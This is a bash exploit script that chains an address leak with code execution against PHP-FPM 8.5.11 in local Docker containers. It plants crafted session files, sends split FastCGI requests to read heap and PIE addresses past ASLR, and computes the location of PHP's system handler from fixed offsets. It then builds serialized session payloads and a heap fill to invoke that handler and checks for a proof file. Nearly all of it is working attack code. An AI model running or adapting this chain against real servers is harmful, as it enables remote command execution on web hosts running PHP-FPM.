#!/usr/bin/env bash
# Native PHP-FPM 8.5.11 chain: app-visible leak (heap+PIE) then stage 2
# (in-band zif_system) on the same worker, ASLR on.
#
# Requires: php:8.5.11-fpm, p2s-nginx-8511 on 9002 with upstream
# p2s-fpm-8511:9000, the p2s-fpm-net network, www/ mounted at /var/www/html.
set -euo pipefail
HERE=$(cd "$(dirname "$0")" && pwd)
ROOT=$(cd "$HERE/.." && pwd)
NAME=${NATIVE_NAME:-p2s-native}
POOL_CONF=${POOL_CONF:-zz-single.conf}
PINS=${PINS:-0}
NET=${NET:-p2s-fpm-net}
NGINX=${NGINX:-p2s-nginx-8511}
NGINX_PORT=${NGINX_PORT:-9002}
FCGI_PORT=${FCGI_PORT:-9003}
IMAGE=${IMAGE:-php:8.5.11-fpm}
INI=${INI:-/usr/local/etc/php/php.ini-production}
MODE=${MODE:-nogdb}
PROBE=${PROBE:-probe-addr.gdb}
PROOF_CONTAINER=/tmp/fpm5_proof

A=11111111111111111111111111111111
LB=22222222222222222222222222222222
EB=33333333333333333333333333333333

if ! docker network inspect "$NET" >/dev/null 2>&1; then
    docker network create "$NET" >/dev/null
fi
docker rm -f "$NAME" p2s-fpm-8511 p2s-leak >/dev/null 2>&1 || true
if [ "$MODE" = gdb ]; then
    docker run -d --name "$NAME" --network "$NET" --network-alias p2s-fpm-8511 \
        -p 127.0.0.1:"$FCGI_PORT":9000 --security-opt seccomp=unconfined \
        -v "$ROOT/www:/var/www/html:ro" \
        -v "$HERE/$POOL_CONF:/usr/local/etc/php-fpm.d/$POOL_CONF:ro" \
        -v "$HERE/$PROBE:/tmp/$PROBE:ro" \
        "$IMAGE" gdb -q -batch -x "/tmp/$PROBE" --args /usr/local/sbin/php-fpm -F -c "$INI" >/dev/null
else
    docker run -d --name "$NAME" --network "$NET" --network-alias p2s-fpm-8511 \
        -p 127.0.0.1:"$FCGI_PORT":9000 \
        -v "$ROOT/www:/var/www/html:ro" \
        -v "$HERE/$POOL_CONF:/usr/local/etc/php-fpm.d/$POOL_CONF:ro" \
        "$IMAGE" php-fpm -F -c "$INI" >/dev/null
fi
sleep 1.7
docker restart "$NGINX" >/dev/null 2>&1 || true
sleep 0.6

PINPID=""
if [ "$PINS" -gt 0 ]; then
    MAX_CHILDREN=${MAX_CHILDREN:-4} python3 "$HERE/pin_fcgi.py" "$FCGI_PORT" "$PINS" >/tmp/p2s_pins.log 2>&1 &
    PINPID=$!
    for _ in $(seq 1 80); do
        grep -q '^ready' /tmp/p2s_pins.log 2>/dev/null && break
        sleep 0.25
    done
    cat /tmp/p2s_pins.log
    sleep "${PIN_SETTLE:-3}"
    trap 'kill "$PINPID" 2>/dev/null' EXIT
fi

printf 'a|i:12345;b|i:12345678901234;c|i:12345678901234;d|i:12345678901234;e|i:123456789012345;' > /tmp/native_small
docker cp "$HERE/payload/sess_A" "$NAME:/tmp/sess_$A" >/dev/null
docker cp /tmp/native_small "$NAME:/tmp/sess_$LB" >/dev/null
docker exec "$NAME" chown 33:33 "/tmp/sess_$A" "/tmp/sess_$LB"
docker exec "$NAME" rm -f "$PROOF_CONTAINER"

if [ "$POOL_CONF" = "zz-multi.conf" ]; then PRE=${PRE:-25500}; else PRE=${PRE:-24576}; fi
A_URL="http://127.0.0.1:$NGINX_PORT/fpm_sess_split2.php?pre=$PRE&pad=1490900&hole=4096"

# 1. leak pair: A OOM primes the stale d, B reflected GET reads OOB
pid=$(docker top "$NAME" -o pid,comm | awk '/php-fpm/ && !/master/ {print $1; exit}')
echo "[leak] worker pid=$pid"
LEAK_TRIES=${LEAK_TRIES:-3}
HEAP=""
PIE=""
for attempt in $(seq 1 "$LEAK_TRIES"); do
    HEAP=""
    PIE=""
    docker cp "$HERE/payload/sess_A" "$NAME:/tmp/sess_$A" >/dev/null
    docker exec "$NAME" chown 33:33 "/tmp/sess_$A"
    curl --max-time 30 -s -o /dev/null -w '[leak] A http=%{http_code}\n' -b "PHPSESSID=$A" "$A_URL"
    python3 "$HERE/fcgi_split.py" "$FCGI_PORT" "$LB" feffffffffffffff 0 0 0 4088 12 \
        /var/www/html/echo.php /tmp/native_leak.bin >/dev/null 2>&1 || true

    read -r HEAP PIE < <(python3 - <<'PY'
import struct, sys
try:
    d = open('/tmp/native_leak.bin', 'rb').read()
except OSError:
    sys.exit(1)
raw = None
for ln in d.split(b'\n'):
    if ln.startswith(b'v5:'):
        try:
            raw = bytes.fromhex(ln[3:].decode())
        except Exception:
            sys.exit(1)
        break
if raw is None or len(raw) < 0x3010:
    sys.exit(1)
heap = None
for off in range(0, len(raw) - 8, 8):
    q = struct.unpack_from('<Q', raw, off)[0]
    if 0x100000000000 < q < 0x800000000000 and (q & 0xfff) == 0x428:
        heap = q
        break
pie = struct.unpack_from('<Q', raw, 0x3008)[0]
if heap is None or pie <= 0x100000000000 or (pie & 0xfff) != 0x777:
    sys.exit(1)
print('%#x %#x' % (heap, pie))
PY
) || true
    if [ -n "${HEAP:-}" ] && [ -n "${PIE:-}" ]; then
        [ "$attempt" -gt 1 ] && echo "[leak] ok on attempt $attempt"
        break
    fi
    echo "[leak] attempt $attempt failed" >&2
    sleep 0.3
done
if [ -z "${HEAP:-}" ] || [ -z "${PIE:-}" ]; then
    echo "[leak] FAILED" >&2
    docker cp "$NAME:/tmp/native_leak.bin" /tmp/native_leak.last >/dev/null 2>&1 || true
    exit 2
fi

DRIFT=${DRIFT:-0x37000}
D=$((HEAP + 0x15cbd8 + DRIFT))
BASE=$((PIE - 0x7c9777))
ZIF=$((BASE + 0x60e3a0))
echo "[leak] heap=$HEAP pie=$PIE"
echo "[calc] d=$D (drift=$DRIFT) base=$BASE zif=$ZIF"

# 2. regenerate the exploit payloads from the leaked base
case "${SESS_MODE:-option2}" in
  mixed)   printf 'a|i:1;b|d:1.5;c|s:1:"x";d|a:1:{i:0;i:1;}e|b:1;' > /tmp/native_sess_T ;;
  dbl)     printf 'a|d:1.5;b|d:2.5;c|d:3.5;d|d:4.5;e|d:5.5;' > /tmp/native_sess_T ;;
  str)     printf 'a|s:1:"x";b|s:1:"y";c|s:1:"z";d|s:1:"p";e|s:1:"q";' > /tmp/native_sess_T ;;
  arr)     printf 'a|a:1:{i:0;i:1;}b|a:1:{i:0;i:2;}c|a:1:{i:0;i:3;}d|a:1:{i:0;i:4;}e|a:1:{i:0;i:5;}' > /tmp/native_sess_T ;;
  bool)    printf 'a|b:1;b|b:0;c|b:1;d|b:0;e|b:1;' > /tmp/native_sess_T ;;
  single)  printf 'a|i:%s;' "$ZIF" > /tmp/native_sess_T ;;
  single_e0) printf 'a|i:8;b|i:%s;' "$ZIF" > /tmp/native_sess_T ;;
  nogdb)   printf 'p1|i:1;p2|i:1;p3|i:1;p4|i:%d;p5|i:%d;p6|i:%d;p7|i:16;p8|i:%s;' $((D + 0x38)) $((D + 0xA00)) $((D + 0xE80)) "$ZIF" > /tmp/native_sess_T ;;
  nogdb_pre) printf 'p1|i:1;p2|i:1;p3|i:1;p4|i:%d;p5|i:%d;' $((D + 0x38)) $((D + 0xA00)) > /tmp/native_sess_T ;;
  *)       printf 'a|i:1;b|i:1;c|i:%d;d|i:1;e|i:%s;f|i:1;' $((D + 0xE00)) "$ZIF" > /tmp/native_sess_T ;;
esac
E0ARG=""
if [ "${SESS_MODE:-option2}" = single_e0 ]; then E0ARG="--e0"; fi
NGBARG=""
if [ "${SESS_MODE:-option2}" = nogdb ] || [ "${SESS_MODE:-option2}" = nogdb_pre ]; then NGBARG="--nogdb"; fi
python3 "$HERE/mk_native_fill.py" --d "$D" --heap "$HEAP" --infile "$HERE/payload/fillU.bin" --out /tmp/native_fill.bin ${NOHT:+--noht} $E0ARG $NGBARG
cat /tmp/native_sess_T
echo
docker cp /tmp/native_sess_T "$NAME:/tmp/sess_$EB" >/dev/null
docker exec "$NAME" chown 33:33 "/tmp/sess_$EB"
echo "[sess] EB file: $(docker exec "$NAME" head -c 100 "/tmp/sess_$EB" 2>/dev/null)"

# 3. exploit pair on the same worker
docker cp "$HERE/payload/sess_A" "$NAME:/tmp/sess_$A" >/dev/null
docker exec "$NAME" chown 33:33 "/tmp/sess_$A"
curl --max-time 30 -s -o /dev/null -w '[exploit] A http=%{http_code}\n' -b "PHPSESSID=$A" "$A_URL"
python3 "$HERE/fcgi_split.py" "$FCGI_PORT" "$EB" feffffffffffffff ${XPAD:-0} 0 1 0 0 \
    /var/www/html/index.php /tmp/native_b.out 12000 150 8170 /tmp/native_fill.bin \
    >/dev/null 2>&1 || true
sleep 0.5

if [ "$MODE" = gdb ]; then
    docker cp "$NAME:/tmp/probe_addr.log" /tmp/probe_addr.log >/dev/null 2>&1 || true
    echo "[gdb] INIT lines:"; grep INIT /tmp/probe_addr.log 2>/dev/null | tail -12 || true
fi

if docker cp "$NAME:$PROOF_CONTAINER" /tmp/native_proof.out >/dev/null 2>&1; then
    echo "[proof] $PROOF_CONTAINER:"
    cat /tmp/native_proof.out
else
    echo "[proof] missing; exploit failed" >&2
    exit 1
fi
